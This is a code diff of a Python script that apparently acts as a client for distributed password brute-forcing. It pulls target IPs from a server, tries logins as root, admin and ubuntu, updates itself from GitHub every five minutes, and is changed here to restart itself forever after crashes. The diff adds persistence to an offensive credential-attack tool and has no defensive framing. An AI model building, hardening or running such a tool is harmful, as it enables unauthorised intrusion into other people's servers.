@@ -157,6 +157,26 @@ def update_check_thread():
         update_script_from_github()
         time.sleep(5 * 60)  # Check for updates every 5 minutes
 
+def run_client_forever():
+    while True:
+        try:
+            CREDS = {}
+            USERS = ["root", "admin", "ubuntu"]
+            NOT_PASSWORD = []
+            # Load other data from the JSON file if required
+
+            while True:
+                target_ip = get_target_from_server()
+                if target_ip:
+                    brute_force_password(target_ip)
+                    LATEST_IP = target_ip
+                else:
+                    print("No more targets.")
+                    break
+        except Exception as e:
+            print("Error occurred:", e)
+            # Wait for a few seconds before restarting
+            time.sleep(5)
 
 if __name__ == "__main__":
     # Start the update check thread in the background
@@ -164,16 +184,5 @@ if __name__ == "__main__":
     update_thread.daemon = True
     update_thread.start()
 
-    CREDS = {}
-    USERS = ["root", "admin", "ubuntu"]
-    NOT_PASSWORD = []
-    # Load other data from the JSON file if required
-
-    while True:
-        target_ip = get_target_from_server()
-        if target_ip:
-            brute_force_password(target_ip)
-            LATEST_IP = target_ip
-        else:
-            print("No more targets.")
-            break
+    # Run the client forever with auto-restart on crash
+    run_client_forever()
